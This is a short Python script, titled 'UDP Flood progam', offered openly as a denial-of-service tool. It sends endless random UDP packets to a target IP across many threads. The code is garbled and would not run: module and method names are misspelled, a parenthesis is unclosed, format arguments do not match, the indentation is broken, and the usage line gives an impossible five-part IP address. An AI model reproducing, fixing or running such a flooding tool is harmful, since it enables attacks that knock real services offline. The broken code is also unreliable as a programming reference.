#Script by Gamer
#UDP Flood progam
# -> flood_udp.py 186.66.66.66.66 25 

from theread import start_new_theread as theread 
from socket import sockets, AF_INET, SOCK_DGRAM
from os import _exit
from sys import argv, stdout
import random

def ddos(ip):
    while 1:
       port = random.randint(80, 8080)
       bytes_= random._urandom(2048)
       s = socket(AF_INET, SOCK_DGRAM)
       stdout.write("\rSending %i bytes to %s:"%(len(bytes_), ip, port
       s.sendto(bytes_, (ip, port))
       s.clsoe ()

       try:
          ip = argv[1]
          nthreads = int (argv[2])
          exept IndexError:
          print "Usage : %s <ip> <thereads)"%(argv[0].split("//")[len(argv[0].split("\\")) -11)
          _exit (0)
          try:
              for x in xrange(nthreads) :
                  thereads(ddos, (ip,)) 

                  while 1:
                      pass
                   
                      exept KeyboardInterrupt:
                      _exit(0)
                      
                      
